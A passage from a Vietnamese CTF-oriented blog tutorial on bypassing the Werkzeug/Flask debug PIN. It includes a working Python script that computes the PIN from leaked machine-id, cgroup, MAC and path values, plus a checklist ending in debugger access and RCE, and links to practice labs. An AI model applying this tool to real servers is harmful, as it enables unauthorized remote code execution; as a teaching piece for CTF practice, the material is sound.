class="line">    <span class="comment"># Werkzeug constants (MD5 version)</span></span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format PIN exactly like Werkzeug</span></span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> (<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x:x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Generate Werkzeug Debug PIN (MD5 – Flask/Werkzeug)&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--username&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;OS username&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--modname&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Module name (flask.app)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--appname&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;App name (Flask / wsgi_app)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--path&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to flask/app.py&quot;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--mac&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;MAC address (uuid.getnode int OR aa:bb:cc:dd:ee:ff)&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--machine-id&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Content of /etc/machine-id OR boot_id&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--cgroup&quot;</span>,</span><br><span class="line">        default=<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Line from /proc/self/cgroup (optional)&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    pin = generate_pin(</span><br><span class="line">        args.username,</span><br><span class="line">        args.modname,</span><br><span class="line">        args.appname,</span><br><span class="line">        args.path,</span><br><span class="line">        args.mac,</span><br><span class="line">        args.machine_id,</span><br><span class="line">        args.cgroup,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Werkzeug PIN:&quot;</span>, pin)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="9-Tool-sinh-PIN-–-SHA1-version"><a href="#9-Tool-sinh-PIN-–-SHA1-version" class="headerlink" title="9. Tool sinh PIN – SHA1 version"></a>9. Tool sinh PIN – SHA1 version</h2><p>File: <strong>gen-sha1-pin.py</strong></p>
+<p>👉 Dùng khi Werkzeug dùng <code>hashlib.sha1</code></p>
+<p>Tool này:</p>
+<ul>
+<li>Có brute modname &#x2F; appname</li>
+<li>Generate cookie debugger</li>
+<li>Dùng cho CTF nâng cao</li>
+</ul>
+<p>Link tool: <a target="_blank" rel="noopener" href="https://github.com/SidneyJob/Werkzeuger/blob/main/gen.py">https://github.com/SidneyJob/Werkzeuger/blob/main/gen.py</a></p>
+<hr>
+<h2 id="10-Checklist-giai-bai-nhanh"><a href="#10-Checklist-giai-bai-nhanh" class="headerlink" title="10. Checklist giải bài nhanh"></a>10. Checklist giải bài nhanh</h2><ul>
+<li><input disabled="" type="checkbox"> Có primitive đọc file</li>
+<li><input disabled="" type="checkbox"> Xác định MD5 hay SHA1</li>
+<li><input disabled="" type="checkbox"> Đọc <code>/etc/machine-id</code></li>
+<li><input disabled="" type="checkbox"> Đọc <code>/proc/self/cgroup</code></li>
+<li><input disabled="" type="checkbox"> Lấy MAC address</li>
+<li><input disabled="" type="checkbox"> Xác định flask path</li>
+<li><input disabled="" type="checkbox"> Generate PIN offline</li>
+<li><input disabled="" type="checkbox"> Truy cập debugger → RCE</li>
+</ul>
+<hr>
+<h2 id="11-Luu-y-thuc-te-CTF"><a href="#11-Luu-y-thuc-te-CTF" class="headerlink" title="11. Lưu ý thực tế CTF"></a>11. Lưu ý thực tế CTF</h2><ul>
+<li>Docker <strong>luôn có cgroup</strong></li>
+<li>Sai <strong>1 byte</strong> → PIN sai</li>
+<li>MAC phải convert đúng integer</li>
+<li>Sai appname&#x2F;modname → brute</li>
+</ul>
+<hr>
+<h2 id="12-Tong-ket"><a href="#12-Tong-ket" class="headerlink" title="12. Tổng kết"></a>12. Tổng kết</h2><blockquote>
+<p>Werkzeug Debug PIN <strong>KHÔNG phải random</strong></p>
+</blockquote>
+<p>Nó là:</p>
+<ul>
+<li>Deterministic</li>
+<li>Phụ thuộc hệ thống</li>
+<li>Có thể tính offline nếu leak đủ thông tin</li>
+</ul>
+<p>👉 Đây là <strong>design flaw có chủ đích</strong>, phục vụ debug, nhưng trở thành <strong>critical vuln</strong> trong CTF.</p>
+<p>Lab luyện tập:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://dreamhack.io/wargame/challenges/74">https://dreamhack.io/wargame/challenges/74</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.root-me.org/en/Challenges/Web-Server/Flask-Development-server">https://www.root-me.org/en/Challenges/Web-Server/Flask-Development-server</a></li>
+</ul>
+<hr>
+<p>Happy hacking.</p>
+<blockquote>
+<p>Ngoài lề: Vì hơi lười nên mình prompt bài viết này (thật ra là AI viết hay hơn mình) :&gt;</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2026/01/18/Research/web/flask-bin/">https://elliotbigfan.github.io/2026/01/18/Research/web/flask-bin/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Research/">Research</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/research/web/poster.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img class="cover" src="/img/ctf/asis/poster.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Writeup: ASIS CTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Bookmarks Phân tích file app.py, ta có thể thấy bug CLRF injection nằm ở hàm dashboard và hoàn toàn có thể tận dụng bug này để gây ra XSS.  1234567891011121314151617181920@app.route(&quot;/dashboard&quot;, methods=[&#x27;GET&#x27;])def dashboard():    user_id = session.get(&quot;user_id&quot;)    if not user_id:        return &quot;User not logged&quot;, 400    username = None    with sqlite3.connect(DB_NAME) as conn:        cur = conn.execute(&quot;SELECT username FROM users WHERE id =...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/14/Research/pwn/fsop/" title="Research: File Stream Oriented Programming (FSOP)"><img class="cover" src="/img/research/pwn/fsop/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">Research: File Stream Oriented Programming (FSOP)</div></div><div class="info-2"><div class="info-item-1">Khái niệm về FILE struct FILE là kiểu dữ liệu (struct) mà thư viện C chuẩn (stdio) dùng để đại diện cho một luồng I&#x2F;O (stream) — ví dụ: file trên đĩa, stdin&#x2F;stdout, pipe, socket… khi dùng fopen&#x2F;fread&#x2F;fwrite&#x2F;fprintf&#x2F;fclose  Cấu trúc của FILE trong glibc: Trong glibc, FILE (thường là _IO_FILE &#x2F; _IO_FILE_plus) là một struct lớn có:  buffer pointers (đang đọc&#x2F;ghi tới đâu) flags&#x2F;mode (đọc&#x2F;ghi, wide&#x2F;byte, lỗi&#x2F;EOF…) file descriptor (fd) loc...</div></div></div></a><a class="pagination-related" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img class="cover" src="/img/ctf/asis/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">Writeup: ASIS CTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Bookmarks Phân tích file app.py, ta có thể thấy bug CLRF injection nằm ở hàm dashboard và hoàn toàn có thể tận dụng bug này để gây ra XSS.  1234567891011121314151617181920@app.route(&quot;/dashboard&quot;, methods=[&#x27;GET&#x27;])def dashboard():    user_id = session.get(&quot;user_id&quot;)    if not user_id:        return &quot;User not logged&quot;, 400    username = None    with sqlite3.connect(DB_NAME) as conn:        cur = conn.execute(&quot;SELECT username FROM users WHERE id =...</div></div></div></a><a class="pagination-related" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img class="cover" src="/img/ctf/lakectf/poster.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">Writeup: LakeCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích qua file server.js, file xử lý chính của challenge:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990app.get(&#x27;/api/balance&#x27;, (req, res) =&gt; &#123;    res.json(&#...</div></div></div></a><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a><a class="pagination-related" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img class="cover" src="/img/ctf/holactf/poster.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-02</div><div class="info-item-2">Writeup: HolaCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Hell EHCIntroduction Đây là một challenge liên quan đến lỗ hổng Deserialization và Wrapper phar:&#x2F;&#x2F; trong PHP (PHP Phar deserialization) Link tải challenge: hell-ehc Cách chạy challenge:  12345# 1. build imagedocker build -t hell_ehc .# 2. Run containerdocker run -it --rm -p 5005:80 hell_ehc  Solution1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn Vì challenge có cho tính năng upload file nên ta sẽ thử kiểm tra liệu có thể tận dụng điều này để upload trực tiếp webshell và ...</div></div></div></a><a class="pagination-related" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img class="cover" src="/img/ctf/backdoor/logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">Writeup: BackdoorCTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: Devil’s Convergence1. Phân tích chương trình: Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:  initialize : khỏi tạo giá trị cho biến toàn cục contract_seal là địa chỉ libc của hàm system và thực thi các hàm setvbuf. control_manipulation: Encode XOR data người dùng truyền vào buf với nửa phần đầu giá trị của biến contract_seal. war_devils_prophecy:  Encode XOR data người dùng truyền vào buf với nửa phần sau giá trị của biến co...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask-Werkzeug-Debug-PIN-%E2%80%93-Full-Theory-Exploitation-Guide"><span class="toc-number">1.</span> <span class="toc-text">Flask &#x2F; Werkzeug Debug PIN – Full Theory &amp; Exploitation Guide</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Tong-quan-bai-toan"><span class="toc-number">1.1.</span> <span class="toc-text">1. Tổng quan bài toán</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Dieu-kien-tien-quyet-Prerequisites"><span class="toc-number">1.2.</span> <span class="toc-text">2. Điều kiện tiên quyết (Prerequisites)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Workflow-tong-quat"><span class="toc-number">1.3.</span> <span class="toc-text">3. Workflow tổng quát</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Buoc-1-%E2%80%93-Xac-dinh-Werkzeug-dung-MD5-hay-SHA1"><span class="toc-number">1.4.</span> <span class="toc-text">4. Bước 1 – Xác định Werkzeug dùng MD5 hay SHA1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-File-can-doc"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 File cần đọc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Cach-nhan-biet"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 Cách nhận biết</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Buoc-2-%E2%80%93-Ly-thuyet-Werkzeug-Debug-PIN"><span class="toc-number">1.5.</span> <span class="toc-text">5. Bước 2 – Lý thuyết Werkzeug Debug PIN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-Cong-thuc-tong-quat"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 Công thức tổng quát</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Public-bits-co-the-doan-doc-duoc"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Public bits (có thể đoán &#x2F; đọc được)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Private-bits-bat-buoc-phai-leak"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">Private bits (bắt buộc phải leak)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Buoc-3-%E2%80%93-Thu-thap-du-lieu-can-thiet"><span class="toc-number">1.6.</span> <span class="toc-text">6. Bước 3 – Thu thập dữ liệu cần thiết</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-Public-bits"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1 Public bits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-Private-bits-quan-trong"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 Private bits (quan trọng)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MAC-address"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">MAC address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Machine-ID"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">Machine ID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cgroup"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">Cgroup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Cach-Werkzeug-xu-ly-machine-id-cgroup"><span class="toc-number">1.7.</span> <span class="toc-text">7. Cách Werkzeug xử lý machine-id + cgroup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Tool-sinh-PIN-%E2%80%93-MD5-version"><span class="toc-number">1.8.</span> <span class="toc-text">8. Tool sinh PIN – MD5 version</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Tool-sinh-PIN-%E2%80%93-SHA1-version"><span class="toc-number">1.9.</span> <span class="toc-text">9. Tool sinh PIN – SHA1 version</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-Checklist-giai-bai-nhanh"><span class="toc-number">1.10.</span> <span class="toc-text">10. Checklist giải bài nhanh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-Luu-y-thuc-te-CTF"><span class="toc-number">1.11.</span> <span class="toc-text">11. Lưu ý thực tế CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-Tong-ket"><span class="toc-number">1.12.</span> <span class="toc-text">12. Tổng kết</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN"><img src="/img/research/web/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Research: Bypass Werkzeug Debug PIN"/></a><div class="content"><a class="title" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN">Research: Bypass Werkzeug Debug PIN</a><time datetime="2026-01-18T13:31:56.000Z" title="Created 2026-01-18 20:31:56">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img src="/img/ctf/asis/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: ASIS CTF 2025"/></a><div class="content"><a class="title" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025">Writeup: ASIS CTF 2025</a><time datetime="2026-01-14T08:07:34.000Z" title="Created 2026-01-14 15:07:34">2026-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/Research/pwn/fsop/" title="Research: File Stream Oriented Programming (FSOP)"><img src="/img/research/pwn/fsop/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Research: File Stream Oriented Programming (FSOP)"/></a><div class="content"><a class="title" href="/2026/01/14/Research/pwn/fsop/" title="Research: File Stream Oriented Programming (FSOP)">Research: File Stream Oriented Programming (FSOP)</a><time datetime="2026-01-14T02:31:32.000Z" title="Created 2026-01-14 09:31:32">2026-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025"><img src="/img/ctf/seccon/logo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: SECCON CTF 2025"/></a><div class="content"><a class="title" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025">Writeup: SECCON CTF 2025</a><time datetime="2025-12-15T01:40:34.000Z" title="Created 2025-12-15 08:40:34">2025-12-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img src="/img/ctf/backdoor/logo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: BackdoorCTF 2025"/></a><div class="content"><a class="title" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025">Writeup: BackdoorCTF 2025</a><time datetime="2025-12-08T10:37:33.000Z" title="Created 2025-12-08 17:37:33">2025-12-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/research/web/poster.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
